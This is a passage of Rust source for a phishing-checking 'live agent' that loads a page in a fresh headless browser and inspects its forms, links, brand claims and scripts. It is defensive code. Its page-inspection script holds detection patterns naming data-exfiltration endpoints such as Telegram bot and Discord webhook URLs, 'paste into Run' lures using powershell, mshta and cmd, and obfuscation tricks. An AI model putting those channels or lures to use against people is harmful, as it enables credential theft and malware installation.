//! The live agent browser (Live Agent page).
//!
//! The agent opens a page in its own headless Chrome, Edge, Brave or Chromium,
//! started for this run with a new, empty profile (none of the user's sign-ins,
//! cookies or extensions), and checks it the way a person would: it reads the
//! page, moves a real mouse to the parts that matter, hovers, and clicks links
//! and buttons. The page is streamed to the window as it is drawn
//! (`Page.startScreencast`), so what the user watches is the page itself, and
//! every cursor position is the real position of the element being checked.
//!
//! What the agent never does: type, fill or submit a form that asks for a
//! password, follow a click off the page, download, or open a new window. A
//! click that would load another page is stopped in the browser
//! (`Fetch.failRequest`) and the address it was going to is recorded: that is
//! how a link that says one site and goes to another is caught. Pop-ups and
//! dialogs are refused and recorded. Addresses on this computer or the local
//! network are not visited, and the run ends after two minutes at most.
//!
//! Nothing here is sent to CyberForge. The browser contacts the page's own site,
//! as the user's browser did; the address comes from the user (typed) or from the
//! privacy-gated history and active-tab commands. Sign-in codes and tokens are
//! removed from the address first (`redact_url`), so a one-time link is not used
//! up by the agent.

use futures_util::{SinkExt, StreamExt};
use serde_json::{json, Value};
use std::collections::HashMap;
use std::net::IpAddr;
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};
use tauri::{AppHandle, Emitter, Manager, State};
use tokio::sync::{mpsc, oneshot, Mutex};
use tokio_tungstenite::tungstenite::Message;

use crate::state::AppState;

type SharedState = Arc<Mutex<AppState>>;

/// The event every step, frame and result is sent on (main window only).
pub const EVENT: &str = "cf-live-browse";
const WIDTH: f64 = 1280.0;
const HEIGHT: f64 = 800.0;
/// Elements the agent moves to in one run.
const MAX_TARGETS: usize = 12;
const RUN_LIMIT: Duration = Duration::from_secs(120);

/// The current run. Starting a run or pressing Stop moves it on; a run that is
/// no longer current stops at its next step and closes its browser.
static RUN: AtomicU64 = AtomicU64::new(0);

fn live(run: u64) -> bool {
    RUN.load(Ordering::SeqCst) == run
}

fn emit(app: &AppHandle, run: u64, kind: &str, data: Value) {
    let mut data = if data.is_object() { data } else { json!({}) };
    data["run"] = json!(run);
    data["type"] = json!(kind);
    let _ = app.emit_to("main", EVENT, data);
}

/// Where a run reports its steps, findings and frames: the main window, or a test.
type Report = Arc<dyn Fn(&str, Value) + Send + Sync>;

fn to_window(app: AppHandle, run: u64) -> Report {
    Arc::new(move |kind: &str, data: Value| emit(&app, run, kind, data))
}

// ── addresses ────────────────────────────────────────────────────────────────

fn private_ip(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(a) => {
            let o = a.octets();
            a.is_private() || a.is_loopback() || a.is_link_local() || a.is_unspecified() || a.is_broadcast()
                || (o[0] == 100 && (o[1] & 0xC0) == 64) // shared address space (carrier NAT)
        }
        IpAddr::V6(a) => {
            let first = a.segments()[0];
            a.is_loopback() || a.is_unspecified() || (first & 0xfe00) == 0xfc00 || (first & 0xffc0) == 0xfe80
                || a.to_ipv4_mapped().map(|v4| private_ip(IpAddr::V4(v4))).unwrap_or(false)
        }
    }
}

/// A name or address that points at this computer or the local network.
pub fn local_host(host: &str) -> bool {
    let h = host.trim().trim_start_matches('[').trim_end_matches(']').trim_end_matches('.').to_lowercase();
    if let Ok(ip) = h.parse::<IpAddr>() {
        return private_ip(ip);
    }
    h.is_empty() || h == "localhost" || !h.contains('.')
        || [".localhost", ".local", ".internal", ".lan", ".home.arpa", ".intranet", ".corp"].iter().any(|s| h.ends_with(s))
}

/// The site a host belongs to, near enough to tell sites apart: the last two
/// labels, or three under a two-letter country code with a generic second level
/// (example.co.uk).
pub fn site(host: &str) -> String {
    let h = host.trim_start_matches("www.").to_lowercase();
    if h.trim_start_matches('[').trim_end_matches(']').parse::<IpAddr>().is_ok() {
        return h;
    }
    let labels: Vec<&str> = h.split('.').filter(|l| !l.is_empty()).collect();
    if labels.len() >= 3 {
        let (sld, tld) = (labels[labels.len() - 2], labels[labels.len() - 1]);
        if tld.len() == 2 && ["co", "com", "org", "net", "ac", "gov", "edu", "or", "ne", "go"].contains(&sld) {
            return labels[labels.len() - 3..].join(".");
        }
    }
    if labels.len() >= 2 { labels[labels.len() - 2..].join(".") } else { h }
}

fn host_of(url: &str) -> String {
    reqwest::Url::parse(url).ok().and_then(|u| u.host_str().map(|h| h.trim_start_matches("www.").to_lowercase())).unwrap_or_default()
}

fn short(text: &str, max: usize) -> String {
    let t: String = text.split_whitespace().collect::<Vec<_>>().join(" ");
    if t.chars().count() > max { format!("{}…", t.chars().take(max).collect::<String>()) } else { t }
}

/// Brands phishing pages imitate: the words that name them, and their own sites.
/// A site whose first label is the brand's (amazon.de, google.fr, mtn.cm) is theirs too.
const BRANDS: &[(&str, &[&str], &[&str])] = &[
    ("PayPal", &["paypal"], &["paypal.com", "paypal.me"]),
    ("Microsoft", &["microsoft", "office 365", "microsoft 365", "outlook", "onedrive", "sharepoint"], &["microsoft.com", "live.com", "office.com", "microsoftonline.com", "outlook.com", "sharepoint.com", "onedrive.com", "microsoft365.com", "office365.com", "bing.com", "msn.com"]),
    ("Apple", &["apple id", "icloud", "apple pay"], &["apple.com", "icloud.com"]),
    ("Google", &["google", "gmail"], &["google.com", "gmail.com", "youtube.com", "googleusercontent.com", "gstatic.com"]),
    ("Amazon", &["amazon"], &["amazon.com"]),
    ("Netflix", &["netflix"], &["netflix.com"]),
    ("Facebook", &["facebook", "meta business"], &["facebook.com", "fb.com", "meta.com"]),
    ("Instagram", &["instagram"], &["instagram.com"]),
    ("WhatsApp", &["whatsapp"], &["whatsapp.com", "whatsapp.net"]),
    ("LinkedIn", &["linkedin"], &["linkedin.com"]),
    ("DHL", &["dhl"], &["dhl.com"]),
    ("FedEx", &["fedex"], &["fedex.com"]),
    ("USPS", &["usps"], &["usps.com"]),
    ("Coinbase", &["coinbase"], &["coinbase.com"]),
    ("Binance", &["binance"], &["binance.com"]),
    ("MetaMask", &["metamask"], &["metamask.io"]),
    ("DocuSign", &["docusign"], &["docusign.com", "docusign.net"]),
    ("Dropbox", &["dropbox"], &["dropbox.com"]),
    ("Adobe", &["adobe"], &["adobe.com"]),
    ("Steam", &["steamcommunity", "steam guard"], &["steampowered.com", "steamcommunity.com"]),
    ("Wells Fargo", &["wells fargo", "wellsfargo"], &["wellsfargo.com"]),
    ("Bank of America", &["bank of america", "bankofamerica"], &["bankofamerica.com"]),
    ("Chase", &["chase bank", "chase online"], &["chase.com"]),
    ("MTN", &["mtn mobile money", "mtn momo", "mymtn"], &["mtn.com", "mtnonline.com"]),
    ("Orange Money", &["orange money"], &["orange.com"]),
    ("Roblox", &["roblox"], &["roblox.com"]),
    ("Discord", &["discord"], &["discord.com", "discord.gg", "discordapp.com"]),
    ("Telegram", &["telegram"], &["telegram.org", "t.me"]),
];

/// The brand's own site, by its list or by the site's first label.
fn brand_owns(official: &[&str], site_name: &str) -> bool {
    let first = site_name.split('.').next().unwrap_or("");
    official.iter().any(|o| *o == site_name || o.split('.').next() == Some(first))
}

/// `word` in `text` as a whole word or phrase.
fn has_word(text: &str, word: &str) -> bool {
    let bytes = text.as_bytes();
    let mut from = 0;
    while let Some(at) = text[from..].find(word) {
        let start = from + at;
        let end = start + word.len();
        let before = start == 0 || !bytes[start - 1].is_ascii_alphanumeric();
        let after = end >= bytes.len() || !bytes[end].is_ascii_alphanumeric();
        if before && after {
            return true;
        }
        from = start + 1;
    }
    false
}

/// Brands a page presents itself as (title, headings, logos) without being on their site.
fn brands_claimed(text: &str, page_site: &str) -> Vec<&'static str> {
    let t = text.to_lowercase();
    BRANDS.iter().filter(|(_, words, official)| !brand_owns(official, page_site) && words.iter().any(|w| has_word(&t, w))).map(|(name, ..)| *name).collect()
}

/// Brands named inside the address of a site that is not theirs (paypal.com.example.xyz, paypal-login.example).
fn brands_in_host(host: &str) -> Vec<&'static str> {
    let site_name = site(host);
    let parts: Vec<&str> = host.split(|c| c == '.' || c == '-').collect();
    BRANDS.iter()
        .filter(|(_, words, official)| !brand_owns(official, &site_name) && words.iter().filter(|w| !w.contains(' ')).any(|w| parts.iter().any(|p| p == w)))
        .map(|(name, ..)| *name)
        .collect()
}

fn header<'a>(headers: &'a Value, name: &str) -> Option<&'a str> {
    headers.as_object()?.iter().find(|(k, _)| k.eq_ignore_ascii_case(name)).and_then(|(_, v)| v.as_str())
}

fn days_from_civil(y: i64, m: i64, d: i64) -> i64 {
    let y = if m <= 2 { y - 1 } else { y };
    let era = if y >= 0 { y } else { y - 399 } / 400;
    let yoe = y - era * 400;
    let mp = (m + 9) % 12;
    let doy = (153 * mp + 2) / 5 + d - 1;
    let doe = yoe * 365 + yoe / 4 - yoe / 100 + doy;
    era * 146_097 + doe - 719_468
}

fn today() -> i64 {
    (std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0) / 86_400) as i64
}

/// Days since an RDAP date ("2024-05-01T12:00:00Z").
fn days_since(iso: &str) -> Option<i64> {
    let mut parts = iso.get(..10)?.split('-').map(|p| p.parse::<i64>().ok());
    let (y, m, d) = (parts.next()??, parts.next()??, parts.next()??);
    Some(today() - days_from_civil(y, m, d))
}

/// When the domain was registered, from the public RDAP directory.
async fn domain_registered(site_name: &str) -> Option<(i64, String)> {
    let reply = crate::http::client_with_timeout(Duration::from_secs(8))
        .get(format!("https://rdap.org/domain/{site_name}"))
        .header("Accept", "application/rdap+json")
        .send()
        .await
        .ok()?;
    let body: Value = reply.json().await.ok()?;
    let date = body["events"].as_array()?.iter().find(|e| e["eventAction"] == "registration")?["eventDate"].as_str()?.to_string();
    Some((days_since(&date)?, date.get(..10).unwrap_or(&date).to_string()))
}

/// CyberForge's server URL models (BERT, DGA and the trained classifiers), when signed in.
async fn server_models(app: &AppHandle, url: &str) -> Option<Value> {
    let state = app.state::<SharedState>();
    if !state.lock().await.is_authenticated {
        return None;
    }
    crate::ml::ml_post(state.inner(), "/api/cyberforge-ml/v2/url-enrich", json!({ "url": url }), 30).await.ok()
}

fn verdict_label(risk: i64) -> &'static str {
    if risk >= 70 { "Likely malicious" } else if risk >= 40 { "Suspicious" } else { "No threat found by these checks" }
}

// ── the browser ──────────────────────────────────────────────────────────────

fn browser_path() -> Option<PathBuf> {
    if let Ok(p) = std::env::var("CYBERFORGE_AGENT_BROWSER") {
        let p = PathBuf::from(p);
        if p.is_file() {
            return Some(p);
        }
    }
    let mut candidates: Vec<PathBuf> = Vec::new();
    #[cfg(windows)]
    for base in ["ProgramFiles(x86)", "ProgramFiles", "LOCALAPPDATA"].iter().filter_map(|v| std::env::var(v).ok()) {
        for exe in [r"Microsoft\Edge\Application\msedge.exe", r"Google\Chrome\Application\chrome.exe", r"BraveSoftware\Brave-Browser\Application\brave.exe", r"Chromium\Application\chrome.exe"] {
            candidates.push(PathBuf::from(&base).join(exe));
        }
    }
    #[cfg(target_os = "macos")]
    for p in ["/Applications/Google Chrome.app/Contents/MacOS/Google Chrome", "/Applications/Microsoft Edge.app/Contents/MacOS/Microsoft Edge",
              "/Applications/Brave Browser.app/Contents/MacOS/Brave Browser", "/Applications/Chromium.app/Contents/MacOS/Chromium"] {
        candidates.push(PathBuf::from(p));
    }
    #[cfg(all(unix, not(target_os = "macos")))]
    for p in ["/usr/bin/google-chrome", "/usr/bin/google-chrome-stable", "/usr/bin/chromium", "/usr/bin/chromium-browser", "/usr/bin/microsoft-edge", "/usr/bin/brave-browser", "/snap/bin/chromium"] {
        candidates.push(PathBuf::from(p));
    }
    candidates.into_iter().find(|p| p.is_file())
}

struct Browser {
    child: tokio::process::Child,
    profile: PathBuf,
    name: String,
}

impl Browser {
    async fn close(&mut self) {
        let _ = self.child.kill().await;
        for _ in 0..12 {
            if !self.profile.exists() || std::fs::remove_dir_all(&self.profile).is_ok() {
                break;
            }
            tokio::time::sleep(Duration::from_millis(300)).await;
        }
    }
}

async fn launch() -> Result<(Browser, String), String> {
    let exe = browser_path().ok_or("No Chrome, Edge, Brave or Chromium was found on this computer; the live agent needs one of them.")?;
    let mut random = [0u8; 8];
    let _ = getrandom::fill(&mut random);
    let profile = std::env::temp_dir().join(format!("cyberforge-agent-browser-{}", random.iter().map(|b| format!("{b:02x}")).collect::<String>()));
    std::fs::create_dir_all(&profile).map_err(|e| format!("Could not prepare the agent's browser: {e}"))?;
    let mut command = tokio::process::Command::new(&exe);
    command
        .args([
            "--headless=new", "--remote-debugging-port=0", "--remote-debugging-address=127.0.0.1",
            "--no-first-run", "--no-default-browser-check", "--disable-background-networking", "--disable-extensions",
            "--disable-sync", "--disable-default-apps", "--disable-component-update", "--mute-audio",
            "--deny-permission-prompts", "--disable-notifications", "--window-size=1280,800",
        ])
        .arg(format!("--user-data-dir={}", profile.display()))
        .arg("about:blank")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .kill_on_drop(true);
    #[cfg(windows)]
    command.creation_flags(0x0800_0000); // no console window
    let child = command.spawn().map_err(|e| format!("The browser could not start: {e}"))?;
    let name = exe.file_stem().map(|s| s.to_string_lossy().to_string()).unwrap_or_else(|| "browser".into());
    let mut browser = Browser { child, profile, name };
    let port_file = browser.profile.join("DevToolsActivePort");
    let started = Instant::now();
    loop {
        if let Ok(text) = std::fs::read_to_string(&port_file) {
            let mut lines = text.lines();
            if let (Some(port), Some(path)) = (lines.next(), lines.next()) {
                if let Ok(port) = port.trim().parse::<u16>() {
                    let ws = format!("ws://127.0.0.1:{port}{}", path.trim());
                    return Ok((browser, ws));
                }
            }
        }
        if started.elapsed() > Duration::from_secs(20) {
            browser.close().await;
            return Err("The agent's browser did not start in time.".into());
        }
        tokio::time::sleep(Duration::from_millis(150)).await;
    }
}

// ── DevTools protocol ────────────────────────────────────────────────────────

type Pending = Arc<std::sync::Mutex<HashMap<u64, oneshot::Sender<Value>>>>;

struct Cdp {
    out: mpsc::UnboundedSender<String>,
    pending: Pending,
    next: AtomicU64,
}

impl Cdp {
    fn frame(&self, method: &str, params: Value, session: Option<&str>) -> (u64, String) {
        let id = self.next.fetch_add(1, Ordering::SeqCst) + 1;
        let mut message = json!({ "id": id, "method": method, "params": params });
        if let Some(s) = session {
            message["sessionId"] = json!(s);
        }
        (id, message.to_string())
    }

    async fn call(&self, method: &str, params: Value, session: Option<&str>) -> Result<Value, String> {
        let (id, text) = self.frame(method, params, session);
        let (tx, rx) = oneshot::channel();
        self.pending.lock().unwrap_or_else(|e| e.into_inner()).insert(id, tx);
        self.out.send(text).map_err(|_| "the agent's browser closed".to_string())?;
        let reply = tokio::time::timeout(Duration::from_secs(20), rx)
            .await
            .map_err(|_| format!("the agent's browser did not answer ({method})"))?
            .map_err(|_| "the agent's browser closed".to_string())?;
        if let Some(error) = reply.get("error") {
            return Err(format!("{method}: {}", error.get("message").and_then(Value::as_str).unwrap_or("refused")));
        }
        Ok(reply.get("result").cloned().unwrap_or(Value::Null))
    }

    /// Send without waiting for the answer.
    fn notify(&self, method: &str, params: Value, session: Option<&str>) {
        let (_, text) = self.frame(method, params, session);
        let _ = self.out.send(text);
    }
}

async fn connect(ws: &str) -> Result<(Arc<Cdp>, mpsc::UnboundedReceiver<Value>), String> {
    let (stream, _) = tokio_tungstenite::connect_async(ws).await.map_err(|e| format!("Could not connect to the agent's browser: {e}"))?;
    let (mut sink, mut source) = stream.split();
    let (out_tx, mut out_rx) = mpsc::unbounded_channel::<String>();
    let (event_tx, event_rx) = mpsc::unbounded_channel::<Value>();
    let pending: Pending = Arc::new(std::sync::Mutex::new(HashMap::new()));
    tauri::async_runtime::spawn(async move {
        while let Some(text) = out_rx.recv().await {
            if sink.send(Message::text(text)).await.is_err() {
                break;
            }
        }
        let _ = sink.close().await;
    });
    let replies = pending.clone();
    tauri::async_runtime::spawn(async move {
        while let Some(Ok(message)) = source.next().await {
            let text = match message {
                Message::Text(t) => t.as_str().to_owned(),
                Message::Binary(b) => String::from_utf8_lossy(&b).into_owned(),
                Message::Close(_) => break,
                _ => continue,
            };
            let Ok(value) = serde_json::from_str::<Value>(&text) else { continue };
            if let Some(id) = value.get("id").and_then(Value::as_u64) {
                if let Some(tx) = replies.lock().unwrap_or_else(|e| e.into_inner()).remove(&id) {
                    let _ = tx.send(value);
                }
            } else if value.get("method").is_some() {
                let _ = event_tx.send(value);
            }
        }
        replies.lock().unwrap_or_else(|e| e.into_inner()).clear();
    });
    Ok((Arc::new(Cdp { out: out_tx, pending, next: AtomicU64::new(0) }), event_rx))
}

async fn eval(cdp: &Cdp, session: Option<&str>, expression: &str) -> Result<Value, String> {
    let result = cdp
        .call("Runtime.evaluate", json!({ "expression": expression, "returnByValue": true, "awaitPromise": true }), session)
        .await?;
    if let Some(e) = result.get("exceptionDetails") {
        return Err(format!("the page refused the check: {}", e.pointer("/exception/description").and_then(Value::as_str).unwrap_or("script error")));
    }
    Ok(result.pointer("/result/value").cloned().unwrap_or(Value::Null))
}

/// What the browser reported while the agent worked.
#[derive(Default)]
struct Observed {
    /// After the page has loaded, a main-frame navigation is stopped and recorded here.
    intercepting: AtomicBool,
    main_frame: std::sync::Mutex<String>,
    redirects: std::sync::Mutex<Vec<String>>,
    stopped: std::sync::Mutex<Vec<String>>,
    dialogs: std::sync::Mutex<Vec<String>>,
    /// Every request the page made, by host.
    hosts: std::sync::Mutex<HashMap<String, u32>>,
    /// The main document's response: status, server address, TLS, headers.
    document: std::sync::Mutex<Value>,
    sockets: std::sync::Mutex<Vec<String>>,
}

fn lock<T>(m: &std::sync::Mutex<T>) -> std::sync::MutexGuard<'_, T> {
    m.lock().unwrap_or_else(|e| e.into_inner())
}

/// Browser events: screen frames to the window (about ten a second), navigations
/// allowed while the page loads and stopped afterwards, dialogs refused.
async fn pump(out: Report, run: u64, cdp: Arc<Cdp>, mut events: mpsc::UnboundedReceiver<Value>, seen: Arc<Observed>) {
    let mut last_sent = Instant::now() - Duration::from_secs(1);
    let mut latest: Option<Value> = None;
    let mut tick = tokio::time::interval(Duration::from_millis(50));
    loop {
        tokio::select! {
            event = events.recv() => {
                let Some(event) = event else { break };
                let session = event.get("sessionId").and_then(Value::as_str).map(str::to_string);
                let params = &event["params"];
                match event["method"].as_str().unwrap_or("") {
                    "Page.screencastFrame" => {
                        cdp.notify("Page.screencastFrameAck", json!({ "sessionId": params["sessionId"] }), session.as_deref());
                        let frame = json!({ "data": params["data"], "width": params["metadata"]["deviceWidth"], "height": params["metadata"]["deviceHeight"] });
                        if last_sent.elapsed() >= Duration::from_millis(45) {
                            last_sent = Instant::now();
                            latest = None;
                            if live(run) { out("frame", frame); }
                        } else {
                            latest = Some(frame);
                        }
                    }
                    "Fetch.requestPaused" => {
                        let id = params["requestId"].clone();
                        let url = params["request"]["url"].as_str().unwrap_or("").to_string();
                        let main = params["frameId"].as_str().map(|f| *lock(&seen.main_frame) == f).unwrap_or(false);
                        if main && seen.intercepting.load(Ordering::SeqCst) {
                            lock(&seen.stopped).push(url);
                            cdp.notify("Fetch.failRequest", json!({ "requestId": id, "errorReason": "Aborted" }), session.as_deref());
                        } else {
                            if main { lock(&seen.redirects).push(url); }
                            cdp.notify("Fetch.continueRequest", json!({ "requestId": id }), session.as_deref());
                        }
                    }
                    "Network.requestWillBeSent" => {
                        let host = host_of(params["request"]["url"].as_str().unwrap_or(""));
                        if !host.is_empty() { *lock(&seen.hosts).entry(host).or_insert(0) += 1; }
                    }
                    "Network.responseReceived" => {
                        let main = params["frameId"].as_str().map(|f| *lock(&seen.main_frame) == f).unwrap_or(false);
                        if main && params["type"] == "Document" && !seen.intercepting.load(Ordering::SeqCst) {
                            *lock(&seen.document) = params["response"].clone();
                        }
                    }
                    "Network.webSocketCreated" => {
                        lock(&seen.sockets).push(short(params["url"].as_str().unwrap_or(""), 200));
                    }
                    "Page.javascriptDialogOpening" => {
                        lock(&seen.dialogs).push(format!("{} “{}”", params["type"].as_str().unwrap_or("dialog"), short(params["message"].as_str().unwrap_or(""), 120)));
                        cdp.notify("Page.handleJavaScriptDialog", json!({ "accept": false }), session.as_deref());
                    }
                    _ => {}
                }
            }
            _ = tick.tick() => {
                if let Some(frame) = latest.take() {
                    last_sent = Instant::now();
                    if live(run) { out("frame", frame); }
                }
            }
        }
    }
}

// ── page scripts ─────────────────────────────────────────────────────────────

/// Before any page script: window.open records the address and opens nothing.
const GUARD_JS: &str = r##"(()=>{window.__cfOpened=[];window.open=function(u){try{window.__cfOpened.push(String(new URL(u,location.href)))}catch(e){window.__cfOpened.push(String(u||''))}return null};})();"##;

/// Read the page: forms, password fields, links, buttons, frames and scripts.
/// Each element the agent may visit is tagged with `data-cf-i`.
const INSPECT_JS: &str = r##"(()=>{
const host=h=>{try{return new URL(h,location.href).hostname.replace(/^www\./,'').toLowerCase()}catch(e){return ''}};
const site=h=>{const l=(h||'').split('.').filter(Boolean);if(l.length>=3&&l[l.length-1].length===2&&['co','com','org','net','ac','gov','edu','or','ne','go'].includes(l[l.length-2]))return l.slice(-3).join('.');return l.slice(-2).join('.')};
const page=host(location.href);
const vis=e=>{const r=e.getBoundingClientRect();const s=getComputedStyle(e);return r.width>2&&r.height>2&&s.visibility!=='hidden'&&s.display!=='none'&&parseFloat(s.opacity||'1')>0.05};
document.querySelectorAll('[target]').forEach(e=>e.removeAttribute('target'));
let n=0;const tag=e=>{const i=n++;e.setAttribute('data-cf-i',String(i));return i};
const domainIn=t=>{const m=(t||'').match(/\b(?:[a-z0-9-]+\.)+(?:com|net|org|io|co|gov|edu|info|biz|uk|de|fr|ru|cn|app|dev|me|us|ca|au|in|ng|cm|za|ke)\b/i);return m?m[0].toLowerCase().replace(/^www\./,''):''};
const text=e=>(e.innerText||e.value||e.getAttribute('aria-label')||e.title||'').replace(/\s+/g,' ').trim().slice(0,120);
const pwForm=e=>{const f=e.closest('form');return !!(f&&f.querySelector('input[type=password]'))};
const forms=[...document.forms].slice(0,30).map(f=>{const a=f.getAttribute('action')||'';let abs='';try{abs=a?new URL(a,location.href).href:''}catch(e){}const ah=abs?host(abs):page;return {i:tag(f),action:abs||'(this page)',actionHost:ah,method:(f.getAttribute('method')||'get').toLowerCase(),hasPassword:!!f.querySelector('input[type=password]'),offsite:!!ah&&site(ah)!==site(page),visible:vis(f)}});
const passwords=[...document.querySelectorAll('input[type=password]')].slice(0,5).map(p=>{const f=p.form;const a=f&&f.getAttribute('action');let ah='';if(f){try{ah=a?host(new URL(a,location.href).href):page}catch(e){ah=page}}return {i:tag(p),visible:vis(p),inForm:!!f,formHost:ah,offsite:!!ah&&site(ah)!==site(page)}});
const links=[...document.querySelectorAll('a[href]')].filter(vis).slice(0,400).map(a=>{const raw=a.getAttribute('href')||'';const h=host(a.href);const t=text(a);const td=domainIn(t);return {i:tag(a),text:t,href:a.href.slice(0,500),host:h,external:!!h&&site(h)!==site(page),js:/^\s*javascript:/i.test(raw),hash:raw.startsWith('#'),textDomain:td,mismatch:!!td&&!!h&&site(td)!==site(h),inPasswordForm:pwForm(a)}});
const buttons=[...document.querySelectorAll('button,input[type=button],input[type=submit],[role=button]')].filter(vis).slice(0,120).map(b=>({i:tag(b),text:text(b),inPasswordForm:pwForm(b)}));
const frames=[...document.querySelectorAll('iframe')];
const scripts=[...new Set([...document.scripts].map(s=>s.src?host(s.src):'').filter(h=>h&&site(h)!==site(page)))].slice(0,40);
const refresh=document.querySelector('meta[http-equiv="refresh" i]');
const inline=[...document.scripts].filter(s=>!s.src).map(s=>s.textContent||'').join('\n').slice(0,600000);
const all=inline+'\n'+document.documentElement.outerHTML.slice(0,400000);
const count=re=>(all.match(re)||[]).length;
const exfil=[...new Set((all.match(/api\.telegram\.org\/bot|discord(?:app)?\.com\/api\/webhooks|formspree\.io|getform\.io|submit-form\.com|formsubmit\.co|webhook\.site|pipedream\.net|requestbin|ngrok(?:-free)?\.(?:io|app|dev)|script\.google\.com\/macros/gi)||[]).map(x=>x.toLowerCase()))].slice(0,6);
const bodyText=(document.body&&document.body.innerText||'').slice(0,20000);
const clipboard=/navigator\.clipboard\.writeText|execCommand\(\s*['"]copy/i.test(inline);
const runDialog=/(?:windows|win)\s*(?:key\s*)?\+\s*r\b|press\s+(?:the\s+)?windows\s+key|ctrl\s*\+\s*v[\s\S]{0,80}enter|\bpowershell\b|\bmshta\b|\bcmd(?:\.exe)?\s+\/c/i.test(bodyText);
const obfuscation={eval:count(/\beval\s*\(/g),atob:count(/\batob\s*\(/g),charCodes:count(/fromCharCode/g),unescape:count(/\bunescape\s*\(/g),docWrite:count(/document\.write\s*\(/g),longBlobs:(inline.match(/[A-Za-z0-9+\/=]{3000,}/g)||[]).length};
const downloads=[...document.querySelectorAll('a[href]')].filter(a=>a.hasAttribute('download')||/\.(exe|msi|scr|bat|cmd|ps1|vbs|js|jar|apk|iso|img|zip|rar|7z|dmg|pkg|hta|lnk)(?:[?#]|$)/i.test(a.href)).slice(0,8).map(a=>({text:text(a).slice(0,60),href:a.href.slice(0,300)}));
const brandText=[document.title,...[...document.querySelectorAll('h1,h2,[class*=logo i],[id*=logo i]')].slice(0,12).map(e=>e.innerText||''),...[...document.images].slice(0,40).map(i=>(i.alt||'')+' '+(i.src||'').split('/').pop())].join(' ').toLowerCase().slice(0,3000);
const icon=document.querySelector('link[rel~="icon" i]');
const hiddenInputs=document.querySelectorAll('input[type=hidden]').length;
const framesElsewhere=[...new Set(frames.map(f=>host(f.src||'')).filter(h=>h&&site(h)!==site(page)))].slice(0,10);
return {title:(document.title||'').slice(0,200),url:location.href,https:location.protocol==='https:',forms,passwords,links,buttons,frames:frames.length,hiddenFrames:frames.filter(f=>!vis(f)).length,scriptHosts:scripts,metaRefresh:refresh?(refresh.getAttribute('content')||'').slice(0,200):'',exfil,clipboard,runDialog,obfuscation,downloads,brandText,favicon:icon?host(icon.href):'',hiddenInputs,framesElsewhere,html:document.documentElement.outerHTML.slice(0,300000)};
})()"##;

/// Bring an element into view only when it is not already well inside it.
fn scroll_js(i: u64) -> String {
    format!("(()=>{{const e=document.querySelector('[data-cf-i=\"{i}\"]');if(!e)return 'missing';const r=e.getBoundingClientRect();if(r.top>=60&&r.bottom<=innerHeight-60&&r.left>=0&&r.right<=innerWidth)return 'visible';e.scrollIntoView({{block:'center',inline:'nearest',behavior:'instant'}});return 'scrolled'}})()")
}

fn measure_js(i: u64) -> String {
    format!("(()=>{{const e=document.querySelector('[data-cf-i=\"{i}\"]');if(!e)return null;const r=e.getBoundingClientRect();return {{x:r.left,y:r.top,w:r.width,h:r.height,href:e.href||'',text:(e.innerText||e.value||e.getAttribute('aria-label')||'').replace(/\\s+/g,' ').trim().slice(0,80)}}}})()")
}

// ── what the agent visits ────────────────────────────────────────────────────

#[derive(Debug, Clone)]
struct Target {
    kind: &'static str, // "password" | "link" | "button"
    i: u64,
    label: String,
    href: String,
    text_domain: String,
}

const KEYWORDS: &[&str] = &["log in", "login", "sign in", "signin", "verify", "account", "password", "update", "secure", "bank", "pay", "wallet", "download", "install", "continue", "confirm", "claim", "prize", "free"];

fn keyword(text: &str) -> bool {
    let t = text.to_lowercase();
    KEYWORDS.iter().any(|k| t.contains(k))
}

/// Password fields first (inspected, never typed into), then the links that
/// matter most (a link whose text names another site, script links, sign-in and
/// payment words, other sites), then a couple of buttons outside sign-in forms.
fn choose_targets(page: &Value) -> Vec<Target> {
    let mut out = Vec::new();
    for p in page["passwords"].as_array().into_iter().flatten().filter(|p| p["visible"] == true).take(2) {
        out.push(Target { kind: "password", i: p["i"].as_u64().unwrap_or(0), label: "the password field".into(), href: String::new(), text_domain: String::new() });
    }
    let mut links: Vec<(i32, &Value)> = page["links"]
        .as_array()
        .into_iter()
        .flatten()
        .filter(|l| l["hash"] != true && !l["text"].as_str().unwrap_or("").is_empty())
        .map(|l| {
            let text = l["text"].as_str().unwrap_or("");
            let score = if l["mismatch"] == true { 100 } else { 0 }
                + if l["js"] == true { 60 } else { 0 }
                + if keyword(text) { 50 } else { 0 }
                + if l["external"] == true { 30 } else { 0 }
                + 1;
            (score, l)
        })
        .collect();
    links.sort_by(|a, b| b.0.cmp(&a.0));
    let mut hrefs = std::collections::HashSet::new();
    for (_, l) in links {
        if out.len() >= MAX_TARGETS - 3 || out.iter().filter(|t| t.kind == "link").count() >= 7 {
            break;
        }
        let href = l["href"].as_str().unwrap_or("").to_string();
        if !hrefs.insert(href.clone()) {
            continue;
        }
        out.push(Target { kind: "link", i: l["i"].as_u64().unwrap_or(0), label: short(l["text"].as_str().unwrap_or(""), 48), href, text_domain: l["textDomain"].as_str().unwrap_or("").to_string() });
    }
    let mut buttons: Vec<&Value> = page["buttons"]
        .as_array()
        .into_iter()
        .flatten()
        .filter(|b| b["inPasswordForm"] != true && !b["text"].as_str().unwrap_or("").is_empty())
        .collect();
    buttons.sort_by_key(|b| if keyword(b["text"].as_str().unwrap_or("")) { 0 } else { 1 });
    for b in buttons.into_iter().take(3) {
        if out.len() >= MAX_TARGETS {
            break;
        }
        out.push(Target { kind: "button", i: b["i"].as_u64().unwrap_or(0), label: short(b["text"].as_str().unwrap_or(""), 48), href: String::new(), text_domain: String::new() });
    }
    out
}

// ── one run ──────────────────────────────────────────────────────────────────

struct Run {
    out: Report,
    id: u64,
    findings: Vec<Value>,
    steps: usize,
}

impl Run {
    fn step(&mut self, action: &str, label: &str, detail: &str, target: Option<Value>) {
        self.steps += 1;
        (self.out)("step", json!({ "n": self.steps, "action": action, "label": label, "detail": detail, "target": target }));
    }
    /// One line of the Evidence list (tone: "good" | "warn" | "bad" | "").
    fn fact(&self, key: &str, value: impl Into<String>, tone: &str) {
        (self.out)("fact", json!({ "key": key, "value": value.into(), "tone": tone }));
    }
    /// severity: "high" | "warn" | "info" | "ok"
    fn find(&mut self, severity: &str, text: &str) {
        let finding = json!({ "severity": severity, "text": text, "step": self.steps });
        self.findings.push(finding.clone());
